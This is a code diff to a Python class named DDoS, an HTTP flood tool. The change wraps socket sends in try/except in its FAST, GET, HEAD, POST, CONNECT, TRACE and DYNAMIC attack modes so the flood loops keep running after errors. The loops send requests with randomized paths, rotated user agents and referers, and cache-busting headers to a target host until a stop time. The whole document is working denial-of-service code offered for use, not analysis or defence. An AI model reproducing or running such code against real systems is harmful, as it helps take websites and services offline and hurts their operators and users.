@@ -168,33 +168,41 @@ class DDoS:
 
             if args.attack_mode == 'FAST':
                 while time.time() < stop:
-                    sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'.encode() )
+                    try: sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'.encode() )
+                    except: pass
 
             elif args.attack_mode == 'GET':
                 while time.time() < stop:
-                    sock.send( f'GET /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n\r\n'.encode() )
-            
+                    try: sock.send( f'GET /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n\r\n'.encode() )
+                    except: pass
+                    
             elif args.attack_mode == 'HEAD':
                 while time.time() < stop:
-                    sock.send( f'HEAD /{randomstr(1, 20)} HTTP/1.1\r\nConnection: close\r\n'.encode() )
+                    try: sock.send( f'HEAD /{randomstr(1, 20)} HTTP/1.1\r\nConnection: close\r\n'.encode() )
+                    except: pass
 
             elif args.attack_mode == 'POST':
                 while time.time() < stop:
-                    sock.send( f'POST /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n{postdata()}'.encode() )
+                    try: sock.send( f'POST /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n{postdata()}'.encode() )
+                    except: pass
                 
             elif args.attack_mode == 'CONNECT':
                 while time.time() < stop:
-                    sock.send( f'CONNECT {host}:{connect_port} HTTP/1.1\r\n'.encode() )
+                    try: sock.send( f'CONNECT {host}:{connect_port} HTTP/1.1\r\n'.encode() )
+                    except: pass
             
             elif args.attack_mode == 'TRACE':
                 while time.time() < stop:
-                    sock.send( f'TRACE /{randomstr(1, 20)} HTTP/1.1'.encode() )
+                    try: sock.send( f'TRACE /{randomstr(1, 20)} HTTP/1.1'.encode() )
+                    except: pass
             
             elif args.attack_mode == 'DYNAMIC':
                 while time.time() < stop:
-                    sock.send( f'GET /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n\r\n'.encode() )
-                    sock.send( f'POST /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n{postdata()}'.encode() )
-            
+                    try:
+                        sock.send( f'GET /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n\r\n'.encode() )
+                        sock.send( f'POST /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n{postdata()}'.encode() )
+                    except: 
+                        pass
             else:
                 print(f'{r}[{rr}!{r}]{rr} Attack method {r}[{rr}{args.attack_mode}{r}]{rr} not recognized')
                 sys.exit()
